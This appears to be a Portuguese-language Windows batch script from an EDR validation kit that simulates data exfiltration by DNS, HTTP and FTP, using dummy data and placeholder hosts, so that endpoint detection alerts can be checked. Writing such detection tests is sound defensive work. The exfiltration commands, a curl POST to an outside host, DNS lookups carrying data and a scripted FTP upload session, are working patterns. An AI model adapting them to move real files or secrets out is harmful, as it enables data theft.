@echo off
chcp 65001 >nul
title [14] Exfiltracao de Dados - Validacao de EDR
color 0E
cls
echo ============================================================
echo   [14] EXFILTRACAO DE DADOS (3 canais)
echo   MITRE ATT&CK: T1048.003 / T1567 / T1048  ^|  Sev.: ALTA
echo ============================================================
echo.
echo   Simula a saida de dados por DNS, HTTP e FTP.
echo   Os dados sao de MENTIRA (apenas 'teste'). Nada real sai.
echo ============================================================
echo.
pause

if not exist "C:\temp" mkdir "C:\temp"

echo.
echo [1/3] Exfiltracao via DNS (T1048.003)...
for /L %%i in (1,1,5) do nslookup dados-teste-%%i.example.com >nul 2>&1
echo     5 consultas DNS com dados simulados enviadas.

echo.
echo [2/3] Exfiltracao via HTTP com curl (T1567)...
curl.exe -s -X POST -d "dados=teste-exfil-lab" https://httpbin.org/post >nul 2>&1
echo     Requisicao HTTP POST com dados simulados enviada.

echo.
echo [3/3] Exfiltracao via FTP (T1048)...
set FTPSCRIPT=C:\temp\roteiro-ftp.txt
(
  echo open ftp.example.com
  echo anonymous
  echo senha@teste
  echo bye
) > "%FTPSCRIPT%"
ftp -s:"%FTPSCRIPT%" >nul 2>&1
echo     Conexao FTP de saida tentada via roteiro.

echo.
echo ------------------------------------------------------------
echo   Verifique o ALERTA no console do seu EDR.
echo   Esperado: Exfiltration / canais incomuns de saida (ALTA).
echo ------------------------------------------------------------
echo.
pause

echo.
echo [*] Limpando arquivos temporarios...
del /q "%FTPSCRIPT%" >nul 2>&1
echo [OK] Limpeza concluida.
echo.
pause
